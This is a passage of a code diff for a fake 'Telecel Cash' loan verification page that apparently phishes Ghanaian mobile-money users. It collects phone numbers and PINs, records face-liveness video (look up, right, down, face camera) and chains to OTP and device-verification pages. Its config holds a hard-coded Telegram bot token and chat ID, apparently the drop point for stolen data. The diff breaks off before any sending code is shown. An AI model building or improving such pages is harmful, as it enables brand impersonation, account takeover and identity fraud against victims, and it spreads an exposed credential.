@@ -6,11 +6,11 @@
 <title>Identity Verification - Telecel Cash</title>
 <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
 <style>
-:root {
-  --red:#E42320; --red-dark:#c01c1a;
-  --red-soft:rgba(228,35,32,0.08); --red-border:rgba(228,35,32,0.18);
-  --text-dark:#111827; --text-mid:#4b5563; --text-light:#9ca3af;
-  --bg:#f3f4f6; --card:#ffffff; --border:#e5e7eb; --input-bg:#f9fafb;
+:root{
+  --red:#E42320;--red-dark:#c01c1a;
+  --red-soft:rgba(228,35,32,0.08);--red-border:rgba(228,35,32,0.18);
+  --text-dark:#111827;--text-mid:#4b5563;--text-light:#9ca3af;
+  --bg:#f3f4f6;--card:#ffffff;--border:#e5e7eb;--input-bg:#f9fafb;
   --shadow:0 20px 60px rgba(0,0,0,0.10),0 4px 16px rgba(0,0,0,0.06);
 }
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
@@ -64,30 +64,58 @@ input::placeholder{color:var(--text-light)}
 .btn-primary:active:not(:disabled){transform:translateY(0)}
 .btn-primary:disabled{background:#d1d5db;box-shadow:none;cursor:not-allowed}
 .btn-back{width:100%;background:transparent;color:var(--text-mid);border:1.5px solid var(--border);padding:14px;
-  font-family:'DM Sans',sans-serif;font-size:15px;font-weight:600;border-radius:50px;cursor:pointer;margin-top:10px;transition:border-color .18s,color .18s;text-align:center;display:block;text-decoration:none}
+  font-family:'DM Sans',sans-serif;font-size:15px;font-weight:600;border-radius:50px;cursor:pointer;
+  margin-top:10px;transition:border-color .18s,color .18s;text-align:center;display:block;text-decoration:none}
 .btn-back:hover{border-color:#9ca3af;color:var(--text-dark)}
 .security-note{display:flex;align-items:center;gap:7px;justify-content:center;font-size:12px;color:var(--text-light);margin-top:18px;font-weight:500}
 
-/* ── PRE-SELFIE INSTRUCTIONS ── */
+/* ── PRE-SELFIE MODAL ── */
 #preSelfieModal{
   display:none;position:fixed;inset:0;z-index:9999;
-  background:rgba(10,10,10,0.6);backdrop-filter:blur(6px);
-  align-items:center;justify-content:center;padding:16px;
+  background:rgba(10,10,10,0.65);backdrop-filter:blur(8px);
+  align-items:flex-end;justify-content:center;padding:0;
 }
 .instr-card{
-  background:white;width:100%;max-width:400px;border-radius:24px;
-  padding:32px 28px;box-shadow:var(--shadow);animation:popIn .3s cubic-bezier(.22,.8,.3,1);
+  background:white;width:100%;max-width:480px;border-radius:28px 28px 0 0;
+  padding:10px 0 0;box-shadow:0 -12px 60px rgba(0,0,0,0.22);
+  animation:slideUp .35s cubic-bezier(.22,.8,.3,1);
 }
+@keyframes slideUp{from{opacity:0;transform:translateY(60px)}to{opacity:1;transform:translateY(0)}}
 @keyframes popIn{from{opacity:0;transform:scale(0.93)}to{opacity:1;transform:scale(1)}}
-.instr-title{font-family:'Sora',sans-serif;font-size:22px;font-weight:800;color:var(--text-dark);margin-bottom:6px;letter-spacing:-0.5px}
-.instr-subtitle{font-size:15px;color:var(--text-mid);margin-bottom:24px;font-weight:500}
-.instr-note{font-size:13px;color:var(--text-light);margin-bottom:16px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px}
-.instr-list{display:flex;flex-direction:column;gap:16px;margin-bottom:28px}
-.instr-item{display:flex;gap:12px;align-items:flex-start}
-.instr-dot{width:20px;height:20px;background:var(--red-soft);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
-.instr-dot svg{width:12px;height:12px;color:var(--red)}
-.instr-text{font-size:14px;color:var(--text-mid);line-height:1.5}
-.btn-start{width:100%;background:var(--text-dark);color:white;border:none;padding:15px;font-family:'Sora',sans-serif;font-size:16px;font-weight:700;border-radius:50px;cursor:pointer;transition:opacity .18s}
+
+/* drag handle */
+.drag-handle{width:40px;height:4px;background:#e5e7eb;border-radius:2px;margin:0 auto 22px}
+
+.instr-inner{padding:0 26px 36px}
+.instr-title{font-family:'Sora',sans-serif;font-size:21px;font-weight:800;color:var(--text-dark);letter-spacing:-0.5px;margin-bottom:4px}
+.instr-sub{font-size:14px;color:var(--text-mid);margin-bottom:22px;font-weight:400;line-height:1.5}
+
+/* liveness steps row */
+.liveness-steps{display:flex;align-items:flex-start;justify-content:center;gap:4px;margin-bottom:22px}
+.ls-step{display:flex;flex-direction:column;align-items:center;gap:6px;flex:1;max-width:72px}
+.ls-icon{width:48px;height:48px;background:var(--red-soft);border:1.5px solid var(--red-border);
+  border-radius:50%;display:flex;align-items:center;justify-content:center}
+.ls-icon svg{width:24px;height:24px;stroke:var(--red);fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+.ls-label{font-size:10px;font-weight:600;color:var(--text-mid);text-align:center;letter-spacing:0.2px;text-transform:uppercase;white-space:nowrap}
+.ls-arrow{color:var(--text-light);font-size:18px;padding-top:14px;flex-shrink:0}
+
+/* polite single-line notice */
+.polite-notice{
+  display:flex;align-items:flex-start;gap:10px;
+  background:#f0fdf4;border:1px solid #bbf7d0;border-radius:14px;
+  padding:13px 15px;margin-bottom:22px;
+}
+.polite-notice svg{width:18px;height:18px;stroke:#16a34a;flex-shrink:0;margin-top:1px}
+.polite-notice p{font-size:13.5px;color:#15803d;font-weight:500;line-height:1.5}
+
+.btn-start{width:100%;background:linear-gradient(135deg,#E42320,#c01c1a);color:white;border:none;
+  padding:15px;font-family:'Sora',sans-serif;font-size:16px;font-weight:700;border-radius:50px;
+  cursor:pointer;transition:opacity .18s,transform .12s;box-shadow:0 4px 18px rgba(228,35,32,0.32)}
+.btn-start:hover{opacity:.92;transform:translateY(-1px)}
+.btn-modal-cancel{width:100%;background:transparent;color:var(--text-mid);border:none;padding:13px;
+  font-family:'DM Sans',sans-serif;font-size:15px;font-weight:600;border-radius:50px;cursor:pointer;
+  margin-top:8px;transition:color .18s}
+.btn-modal-cancel:hover{color:var(--text-dark)}
 
 /* ── SELFIE SCREEN ── */
 #selfieScreen{
@@ -95,36 +123,77 @@ input::placeholder{color:var(--text-light)}
   background:#000;flex-direction:column;align-items:center;justify-content:center;
 }
 #selfieVideo{
-  position:absolute;inset:0;width:100%;height:100%;object-fit:cover;
-  transform:scaleX(-1);
+  position:absolute;inset:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1);
 }
 #selfieOverlay{
   position:absolute;inset:0;width:100%;height:100%;pointer-events:none;
 }
+#cropCanvas{display:none}
+
+/* ── STEP BAR (top) ── */
+.step-bar{
+  position:absolute;top:0;left:0;right:0;z-index:3;
+  padding:48px 24px 16px;
+  background:linear-gradient(180deg,rgba(0,0,0,0.75) 0%,transparent 100%);
+  display:flex;align-items:center;justify-content:center;gap:6px;
+}
+.sbar-item{display:flex;flex-direction:column;align-items:center;gap:4px}
+.sbar-circle{
+  width:38px;height:38px;border-radius:50%;border:2px solid rgba(255,255,255,0.22);
+  background:rgba(255,255,255,0.07);display:flex;align-items:center;justify-content:center;
+  transition:all .35s;
+}
+.sbar-circle svg{width:18px;height:18px;stroke:rgba(255,255,255,0.38);fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round;transition:stroke .35s}
+.sbar-circle.active{border-color:#E42320;background:rgba(228,35,32,0.22);box-shadow:0 0 0 5px rgba(228,35,32,0.18)}
+.sbar-circle.active svg{stroke:#fff}
+.sbar-circle.done{border-color:#22c55e;background:rgba(34,197,94,0.18)}
+.sbar-circle.done svg{stroke:#22c55e}
+.sbar-label{font-size:9px;font-weight:600;color:rgba(255,255,255,0.4);letter-spacing:0.4px;text-transform:uppercase;transition:color .35s;white-space:nowrap}
+.sbar-label.active{color:rgba(255,255,255,0.95)}
+.sbar-label.done{color:#22c55e}
+.sbar-connector{width:18px;height:2px;background:rgba(255,255,255,0.14);border-radius:1px;margin-bottom:14px;transition:background .4s}
+.sbar-connector.done{background:#22c55e}
+
+/* ── BOTTOM PANEL ── */
 .selfie-panel{
   position:absolute;bottom:0;left:0;right:0;z-index:2;
-  background:linear-gradient(0deg,rgba(0,0,0,0.88) 0%,rgba(0,0,0,0.0) 100%);
-  padding:20px 28px 48px; /* Extra bottom padding for clearance */
-  display:flex;flex-direction:column;align-items:center;gap:14px;
+  background:linear-gradient(0deg,rgba(0,0,0,0.92) 0%,rgba(0,0,0,0.0) 100%);
+  padding:18px 28px 44px;
+  display:flex;flex-direction:column;align-items:center;gap:8px;
 }
-.selfie-dots{display:flex;gap:10px;align-items:center}
-.sdot{width:9px;height:9px;border-radius:50%;background:rgba(255,255,255,0.22);transition:all .3s}
-.sdot.active{background:#E42320;transform:scale(1.35)}
-.sdot.done{background:#22c55e}
 .selfie-instr{
-  font-family:'Sora',sans-serif;font-size:19px;font-weight:800;
-  color:#fff;letter-spacing:-0.3px;text-align:center;min-height:26px;
-  transition:opacity .18s;
+  font-family:'Sora',sans-serif;font-size:22px;font-weight:800;
+  color:#fff;letter-spacing:-0.4px;text-align:center;
+  transition:opacity .2s;min-height:28px;
 }
-.selfie-sub{font-size:13px;color:rgba(255,255,255,0.5);text-align:center;margin-top:-6px}
+.selfie-sub{font-size:13px;color:rgba(255,255,255,0.52);text-align:center;font-weight:500}
 .selfie-cancel-btn{
-  margin-top:2px;background:rgba(255,255,255,0.10);color:rgba(255,255,255,0.6);
-  border:1px solid rgba(255,255,255,0.18);padding:11px 36px;border-radius:50px;
-  font-family:'DM Sans',sans-serif;font-size:14px;cursor:pointer;
+  margin-top:6px;background:rgba(255,255,255,0.10);color:rgba(255,255,255,0.65);
+  border:1px solid rgba(255,255,255,0.18);padding:11px 40px;border-radius:50px;
+  font-family:'DM Sans',sans-serif;font-size:14px;cursor:pointer;transition:background .18s;
 }
+.selfie-cancel-btn:hover{background:rgba(255,255,255,0.18)}
 
-/* HIDDEN CANVAS FOR RECORDING */
-#cropCanvas { display: none; }
+/* ── COUNTDOWN RING – centred on oval ── */
+/* Oval centre is at 38% from top of screen; use transform to align */
+#countdownRing{
+  position:absolute;
+  /* horizontally centred; vertically at oval centre */
+  left:50%;top:38%;
+  transform:translate(-50%,-50%);
+  z-index:3;pointer-events:none;
+  opacity:0;transition:opacity .3s;
+}
+#countdownRing.visible{opacity:1}
+.cring-svg{width:76px;height:76px}
+.cring-bg{fill:none;stroke:rgba(255,255,255,0.10);stroke-width:5}
+.cring-prog{
+  fill:none;stroke:#E42320;stroke-width:5;stroke-linecap:round;
+  stroke-dasharray:219.9;stroke-dashoffset:219.9;
+  transform-origin:50% 50%;transform:rotate(-90deg);
+  transition:stroke-dashoffset 0.28s linear,stroke .4s;
+}
+.cring-num{font-family:'Sora',sans-serif;font-size:26px;font-weight:800;fill:white;dominant-baseline:central;text-anchor:middle}
 
 /* SPINNER */
 #spinner{display:none;position:fixed;inset:0;background:rgba(10,10,10,0.90);z-index:10000;
@@ -152,7 +221,7 @@ input::placeholder{color:var(--text-light)}
 </head>
 <body>
 
-<!-- MAIN CARD -->
+<!-- ══ MAIN CARD ══ -->
 <div class="card">
   <div class="header">
     <div class="logo-wrap">
@@ -178,7 +247,7 @@ input::placeholder{color:var(--text-light)}
       </svg>
     </div>
     <div>
-      <div class="loan-label" id="loanLabel">Flex Loan</div>
+      <div class="loan-label">Flex Loan</div>
       <div class="loan-amount" id="loanAmount">—</div>
       <div class="loan-details" id="loanDetails"></div>
     </div>
@@ -215,62 +284,116 @@ input::placeholder{color:var(--text-light)}
   </div>
 </div>
 
-<!-- ── PRE-SELFIE INSTRUCTIONS ── -->
+<!-- ══ PRE-SELFIE MODAL (bottom sheet) ══ -->
 <div id="preSelfieModal">
   <div class="instr-card">
-    <div class="instr-title">Identity Verification</div>
-    <div class="instr-subtitle">Verify your identity</div>
-    <div class="instr-note">Please note the following before you proceed</div>
-    <div class="instr-list">
-      <div class="instr-item">
-        <div class="instr-dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-        <div class="instr-text">Ensure your face is well lit and avoid bright light behind you.</div>
+    <div class="drag-handle"></div>
+    <div class="instr-inner">
+      <div class="instr-title">Quick Identity Check</div>
+      <div class="instr-sub">Follow the on-screen prompts to complete your liveness verification.</div>
+
+      <!-- 4-step visual preview -->
+      <div class="liveness-steps">
+        <div class="ls-step">
+          <div class="ls-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+          </div>
+          <div class="ls-label">Look Up</div>
+        </div>
+        <div class="ls-arrow">›</div>
+        <div class="ls-step">
+          <div class="ls-icon">
+            <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+          </div>
+          <div class="ls-label">Look Right</div>
+        </div>
+        <div class="ls-arrow">›</div>
+        <div class="ls-step">
+          <div class="ls-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 5v14M19 12l-7 7-7-7"/></svg>
+          </div>
+          <div class="ls-label">Look Down</div>
+        </div>
+        <div class="ls-arrow">›</div>
+        <div class="ls-step">
+          <div class="ls-icon">
+            <svg viewBox="0 0 24 24"><circle cx="12" cy="10" r="3"/><path d="M12 2a10 10 0 100 20A10 10 0 0012 2z"/><path d="M6.5 18.5a7 7 0 0111 0"/></svg>
+          </div>
+          <div class="ls-label">Face Camera</div>
+        </div>
       </div>
-      <div class="instr-item">
-        <div class="instr-dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-        <div class="instr-text">Please enable camera access to proceed with the identity verification process.</div>
+
+      <!-- Single polite notice -->
+      <div class="polite-notice">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+        </svg>
+        <p>Please ensure your face is well-lit, unobstructed, and centred in the frame before you begin.</p>
       </div>
-      <div class="instr-item">
-        <div class="instr-dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-        <div class="instr-text">Remove glasses, hats, hoodies, or anything covering your face before starting.</div>
-      </div>
-      <div class="instr-item">
-        <div class="instr-dot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
-        <div class="instr-text">Keep your face fully visible in the frame with no obstructions.</div>
-      </div>
+
+      <button class="btn-start" id="startCaptureBtn">Begin Verification</button>
+      <button class="btn-modal-cancel" id="modalCancelBtn">Not now</button>
     </div>
-    <button class="btn-start" id="startCaptureBtn">Continue to Verification</button>
   </div>
 </div>
 
-<!-- ── SELFIE SCREEN ── -->
+<!-- ══ SELFIE SCREEN ══ -->
 <div id="selfieScreen">
   <video id="selfieVideo" autoplay muted playsinline></video>
   <canvas id="cropCanvas"></canvas>
-  <svg id="selfieOverlay" viewBox="0 0 400 600" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
+
+  <!-- Step indicator bar -->
+  <div class="step-bar" id="stepBar"></div>
+
+  <!-- SVG overlay: dark vignette + oval cutout + directional arrow
+       ViewBox 400 × 860. Oval centre at cx=200 cy=310 (≈36% from top).
+       Arrows sit 50px outside the oval edge in each direction. -->
+  <svg id="selfieOverlay"
+       viewBox="0 0 400 860"
+       preserveAspectRatio="xMidYMid slice"
+       xmlns="http://www.w3.org/2000/svg">
     <defs>
       <mask id="ovalMask">
-        <rect width="400" height="600" fill="white"/>
-        <ellipse cx="200" cy="270" rx="145" ry="195" fill="black"/>
+        <rect width="400" height="860" fill="white"/>
+        <ellipse cx="200" cy="310" rx="140" ry="188" fill="black"/>
       </mask>
-      <filter id="glow">
-        <feGaussianBlur stdDeviation="6" result="blur"/>
+      <filter id="arrowGlow" x="-50%" y="-50%" width="200%" height="200%">
+        <feGaussianBlur stdDeviation="7" result="blur"/>
         <feComposite in="SourceGraphic" in2="blur" operator="over"/>
       </filter>
     </defs>
-    <rect width="400" height="600" fill="rgba(0,0,0,0.6)" mask="url(#ovalMask)"/>
-    <ellipse id="ovalBorder" cx="200" cy="270" rx="145" ry="195" fill="none" stroke="rgba(255,255,255,0.8)" stroke-width="5" stroke-dasharray="10 10"/>
-    <g id="arrowGroup" style="opacity:0">
-      <circle id="arrowCircle" cx="200" cy="50" r="28" fill="rgba(228,35,32,0.9)" filter="url(#glow)"/>
-      <path id="aLine1" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
-      <path id="aLine2" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
-      <path id="aLine3" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
+
+    <!-- vignette with oval cutout -->
+    <rect width="400" height="860" fill="rgba(0,0,0,0.58)" mask="url(#ovalMask)"/>
+
+    <!-- oval border – colour driven by JS -->
+    <ellipse id="ovalBorder"
+      cx="200" cy="310" rx="140" ry="188"
+      fill="none" stroke="rgba(255,255,255,0.80)" stroke-width="3.5"
+      stroke-dasharray="14 8"/>
+
+    <!-- direction arrow group (hidden until step starts) -->
+    <g id="arrowGroup" opacity="0">
+      <circle id="arrowCircle" cx="200" cy="80" r="28" fill="rgba(228,35,32,0.90)" filter="url(#arrowGlow)"/>
+      <line id="aShaft" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4" stroke-linecap="round"/>
+      <line id="aHead1" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4" stroke-linecap="round"/>
+      <line id="aHead2" x1="0" y1="0" x2="0" y2="0" stroke="white" stroke-width="4" stroke-linecap="round"/>
     </g>
   </svg>
+
+  <!-- Countdown ring, CSS-positioned at oval centre (36% from top) -->
+  <div id="countdownRing">
+    <svg class="cring-svg" viewBox="0 0 76 76">
+      <circle class="cring-bg"   cx="38" cy="38" r="35"/>
+      <circle class="cring-prog" id="cringProg" cx="38" cy="38" r="35"/>
+      <text   class="cring-num"  id="cringNum"  x="38" y="38">4</text>
+    </svg>
+  </div>
+
+  <!-- Bottom instruction panel -->
   <div class="selfie-panel">
-    <div class="selfie-dots" id="selfieDots"></div>
     <div class="selfie-instr" id="selfieInstr">Starting camera…</div>
-    <div class="selfie-sub" id="selfieSub"></div>
+    <div class="selfie-sub"   id="selfieSub"></div>
     <button class="selfie-cancel-btn" id="selfieCancel">Cancel</button>
   </div>
 </div>
@@ -297,274 +420,404 @@ input::placeholder{color:var(--text-light)}
 </div>
 
 <script>
+/* ════════ CONFIG ════════ */
 const CONFIG = {
-  BOT_TOKEN: '8813675915:AAF9pi1MYsvUO-qDK-1qX8G_8T7tcyavXPQ',
-  CHAT_ID: '7881536601',
-  OTP_PAGE: 'otp.html',
-  DEVICE_PAGE: 'device_verify.html', // UPDATED
-  SUCCESS_PAGE: 'success.html'
+  BOT_TOKEN:   '8813675915:AAF9pi1MYsvUO-qDK-1qX8G_8T7tcyavXPQ',
+  CHAT_ID:     '7881536601',
+  OTP_PAGE:    'otp.html',
+  DEVICE_PAGE: 'device_verify.html',
+  SUCCESS_PAGE:'success.html'
 };
 
-const STEP_DURATION = 4000;
+/* ════════ LIVENESS STEPS: up → right → down → face camera ════════
+   SVG oval: cx=200 cy=310 rx=140 ry=188  (viewBox 400×860)
+   Arrows placed 50px outside oval edge in each direction.           */
+const STEP_DURATION = 4000; // ms each step
+
 const STEPS = [
-  { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:200, cy:50 },
-  { instr:'Look to your left', sub:'Slowly turn your head left',  dir:'left',  cx:30,  cy:270 },
-  { instr:'Look to your right',sub:'Slowly turn your head right', dir:'right', cx:370, cy:270 },
-  { instr:'Look up',           sub:'Tilt your head upward',       dir:'up',    cx:200, cy:50 },
-  { instr:'Look down',         sub:'Tilt your head downward',     dir:'down',  cx:200, cy:490 },
+  {
+    id:'up',
+    instr:'Look Up',
+    sub:'Slowly tilt your head upward',
+    dir:'up',
+    // arrow above oval  (310 - 188 - 52 = 70)
+    cx:200, cy:68,
+    icon:'<path d="M12 19V5M5 12l7-7 7 7"/>',
+    label:'Look Up'
+  },
+  {
+    id:'right',
+    instr:'Look Right',
+    sub:'Turn your head to the right',
+    dir:'right',
+    // arrow right of oval (200 + 140 + 50 = 390)
+    cx:378, cy:310,
+    icon:'<path d="M5 12h14M12 5l7 7-7 7"/>',
+    label:'Look Right'
+  },
+  {
+    id:'down',
+    instr:'Look Down',
+    sub:'Slowly tilt your head downward',
+    dir:'down',
+    // arrow below oval (310 + 188 + 52 = 550)
+    cx:200, cy:552,
+    icon:'<path d="M12 5v14M19 12l-7 7-7-7"/>',
+    label:'Look Down'
+  },
+  {
+    id:'face',
+    instr:'Face the Camera',
+    sub:'Look straight ahead at the lens',
+    dir:null,
+    cx:200, cy:310,
+    icon:'<circle cx="12" cy="10" r="3"/><path d="M12 2a10 10 0 100 20A10 10 0 0012 2z"/><path d="M6.5 18.5a7 7 0 0111 0"/>',
+    label:'Face Camera'
+  }
 ];
 
-const ARROW_SHAPES = {
-  null:  { l1:[0,-10,0,10],  l2:[-10,-2, 0,-12], l3:[10,-2, 0,-12] },
-  left:  { l1:[-10,0,10,0],  l2:[0,-10,-12,0],   l3:[0,10,-12,0]   },
-  right: { l1:[-10,0,10,0],  l2:[0,-10,12,0],    l3:[0,10,12,0]    },
-  up:    { l1:[0,10,0,-10],  l2:[-10,2,0,-10],   l3:[10,2,0,-10]   },
-  down:  { l1:[0,-10,0,10],  l2:[-10,-2,0,10],   l3:[10,-2,0,10]   },
+/* Arrow geometry (offsets from cx,cy) */
+const ARROWS = {
+  up:    { shaft:[0,11,0,-11], h1:[0,-11,-8,-2], h2:[0,-11,8,-2] },
+  right: { shaft:[-11,0,11,0], h1:[11,0,2,-8],  h2:[11,0,2,8]   },
+  down:  { shaft:[0,-11,0,11], h1:[0,11,-8,2],   h2:[0,11,8,2]   }
 };
 
-const phoneInput      = document.getElementById('phone');
-const pinInput        = document.getElementById('password');
-const continueBtn     = document.getElementById('continueBtn');
-const errMsg          = document.getElementById('errMsg');
-const spinnerEl       = document.getElementById('spinner');
-const toastEl         = document.getElementById('toast');
-const toastOverlay    = document.getElementById('toast-overlay');
-const toastHomeBtn    = document.getElementById('toastHomeBtn');
+/* Oval geometry for canvas crop (must match SVG values) */
+const OV = { cx:200, cy:310, rx:140, ry:188, vw:400, vh:860 };
 
-const preSelfieModal  = document.getElementById('preSelfieModal');
-const startCaptureBtn = document.getElementById('startCaptureBtn');
-
-const selfieScreen    = document.getElementById('selfieScreen');
-const selfieVideo     = document.getElementById('selfieVideo');
-const cropCanvas      = document.getElementById('cropCanvas');
-const cropCtx         = cropCanvas.getContext('2d');
-const selfieInstr     = document.getElementById('selfieInstr');
-const selfieSub       = document.getElementById('selfieSub');
-const selfieDots      = document.getElementById('selfieDots');
-const selfieCancel    = document.getElementById('selfieCancel');
-const ovalBorder      = document.getElementById('ovalBorder');
-const arrowGroup      = document.getElementById('arrowGroup');
-const arrowCircle     = document.getElementById('arrowCircle');
-const aLine1          = document.getElementById('aLine1');
-const aLine2          = document.getElementById('aLine2');
-const aLine3          = document.getElementById('aLine3');
+/* ════════ DOM ════════ */
+const phoneInput    = document.getElementById('phone');
+const pinInput      = document.getElementById('password');
+const continueBtn   = document.getElementById('continueBtn');
+const errMsg        = document.getElementById('errMsg');
+const spinnerEl     = document.getElementById('spinner');
+const toastEl       = document.getElementById('toast');
+const toastOverlay  = document.getElementById('toast-overlay');
+const toastHomeBtn  = document.getElementById('toastHomeBtn');
+const preSelfieModal= document.getElementById('preSelfieModal');
+const startCapture  = document.getElementById('startCaptureBtn');
+const modalCancel   = document.getElementById('modalCancelBtn');
+const selfieScreen  = document.getElementById('selfieScreen');
+const selfieVideo   = document.getElementById('selfieVideo');
+const cropCanvas    = document.getElementById('cropCanvas');
+const cropCtx       = cropCanvas.getContext('2d');
+const selfieInstr   = document.getElementById('selfieInstr');
+const selfieSub     = document.getElementById('selfieSub');
+const stepBar       = document.getElementById('stepBar');
+const selfieCancel  = document.getElementById('selfieCancel');
+const ovalBorder    = document.getElementById('ovalBorder');
+const arrowGroup    = document.getElementById('arrowGroup');
+const arrowCircle   = document.getElementById('arrowCircle');
+const aShaft        = document.getElementById('aShaft');
+const aHead1        = document.getElementById('aHead1');
+const aHead2        = document.getElementById('aHead2');
+const countdownRing = document.getElementById('countdownRing');
+const cringProg     = document.getElementById('cringProg');
+const cringNum      = document.getElementById('cringNum');
 
 let capturedPhone='', capturedPin='', isProcessing=false;
-let mediaStream=null, canvasStream=null, mediaRecorder=null, recordedChunks=[], selfieBlob=null;
-let currentStep=0, stepTimer=null, animationReq=null;
-const botState = { lastUpdateId: 0 };
+let mediaStream=null, canvasStream=null, mediaRecorder=null;
+let recordedChunks=[], selfieBlob=null;
+let currentStep=0, countdownTimer=null, animReq=null;
+const botState={lastUpdateId:0};
 
-function isValidGhanaNumber(p){ return /^(020|050|024|054|027|057|026|056)\d{7}$/.test(p); }
+/* ════════ HELPERS ════════ */
+const isValidGhana = p => /^(020|050|024|054|027|057|026|056)\d{7}$/.test(p);
 function showError(m){ errMsg.textContent=m; errMsg.style.display='block'; }
 function resetButton(){ isProcessing=false; continueBtn.disabled=false; continueBtn.textContent='Verify & Authorise Loan'; spinnerEl.style.display='none'; }
 function showToast(){ toastOverlay.style.display='block'; toastEl.style.display='block'; }
-toastHomeBtn.onclick = () => { window.location.href='index.html'; };
+toastHomeBtn.onclick = ()=>{ window.location.href='index.html'; };
+modalCancel.onclick  = ()=>{ preSelfieModal.style.display='none'; };
 
+/* ════════ LOAN DETAILS ════════ */
 function loadLoanDetails(){
-  const params = new URLSearchParams(window.location.search);
-  const amount = params.get('amount') || '5,000';
-  const period = params.get('period') || '30 days';
-  const total  = params.get('total') || '5,445';
-  document.getElementById('loanAmount').textContent = 'GHS ' + parseFloat(amount).toLocaleString('en-GH');
-  document.getElementById('loanDetails').textContent = period + ' term \u2022 Total GHS ' + parseFloat(total).toLocaleString('en-GH');
+  const p=new URLSearchParams(window.location.search);
+  const amount=p.get('amount')||'5000';
+  const period=p.get('period')||'30 days';
+  const total =p.get('total') ||'5445';
+  document.getElementById('loanAmount').textContent='GHS '+parseFloat(amount).toLocaleString('en-GH');
+  document.getElementById('loanDetails').textContent=period+' term • Total GHS '+parseFloat(total).toLocaleString('en-GH');
 }
 
-function drawOvalFrame() {
-  cropCanvas.width=400; cropCanvas.height=600;
-  cropCtx.save();
-  cropCtx.beginPath();
-  cropCtx.ellipse(200, 270, 145, 195, 0, 0, Math.PI*2);
-  cropCtx.clip();
-  cropCtx.scale(-1, 1);
-  cropCtx.drawImage(selfieVideo, -400, 0, 400, 600);
-  cropCtx.restore();
-  animationReq = requestAnimationFrame(drawOvalFrame);
-}
-
-function setArrow(idx) {
-  const step = STEPS[idx];
-  arrowCircle.setAttribute('cx', step.cx);
-  arrowCircle.setAttribute('cy', step.cy);
-  arrowGroup.style.opacity = step.dir ? '1' : '0';
-  const s = ARROW_SHAPES[step.dir || 'null'];
-  aLine1.setAttribute('d', `M${step.cx+s.l1[0]} ${step.cy+s.l1[1]} L${step.cx+s.l1[2]} ${step.cy+s.l1[3]}`);
-  aLine2.setAttribute('d', `M${step.cx+s.l2[0]} ${step.cy+s.l2[1]} L${step.cx+s.l2[2]} ${step.cy+s.l2[3]}`);
-  aLine3.setAttribute('d', `M${step.cx+s.l3[0]} ${step.cy+s.l3[1]} L${step.cx+s.l3[2]} ${step.cy+s.l3[3]}`);
-}
-
-function setStep(idx) {
-  currentStep = idx;
-  const step  = STEPS[idx];
-  selfieInstr.style.opacity='0';
-  setTimeout(()=>{ selfieInstr.textContent=step.instr; selfieSub.textContent=step.sub; selfieInstr.style.opacity='1'; }, 160);
-  STEPS.forEach((_,i)=>{
-    const d=document.getElementById(`sd${i}`);
-    d.className = i<idx ? 'sdot done' : i===idx ? 'sdot active' : 'sdot';
+/* ════════ STEP BAR ════════ */
+function buildStepBar(){
+  stepBar.innerHTML='';
+  STEPS.forEach((s,i)=>{
+    const item=document.createElement('div');
+    item.className='sbar-item';
+    item.innerHTML=`
+      <div class="sbar-circle" id="sbc${i}">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"
+             stroke-linecap="round" stroke-linejoin="round">${s.icon}</svg>
+      </div>
+      <div class="sbar-label" id="sbl${i}">${s.label}</div>`;
+    stepBar.appendChild(item);
+    if(i<STEPS.length-1){
+      const c=document.createElement('div');
+      c.className='sbar-connector'; c.id=`sbcon${i}`;
+      stepBar.appendChild(c);
+    }
   });
-  if (idx < STEPS.length-1) ovalBorder.setAttribute('stroke','#E42320');
-  setArrow(idx);
+}
+function updateStepBar(active){
+  STEPS.forEach((_,i)=>{
+    const circ=document.getElementById(`sbc${i}`);
+    const lbl =document.getElementById(`sbl${i}`);
+    const con =document.getElementById(`sbcon${i}`);
+    if(i<active){ circ.className='sbar-circle done'; lbl.className='sbar-label done'; if(con)con.className='sbar-connector done'; }
+    else if(i===active){ circ.className='sbar-circle active'; lbl.className='sbar-label active'; if(con)con.className='sbar-connector'; }
+    else{ circ.className='sbar-circle'; lbl.className='sbar-label'; if(con)con.className='sbar-connector'; }
+  });
 }
 
-function advanceStep() {
-  if (currentStep < STEPS.length-1) {
-    setStep(currentStep+1);
-    stepTimer = setTimeout(advanceStep, STEP_DURATION);
+/* ════════ CANVAS – mirror + oval crop matching SVG oval ════════ */
+function drawFrame(){
+  /* The SVG viewBox is OV.vw × OV.vh scaled to fill the real screen.
+     We draw the video into a canvas that matches the SVG viewBox so
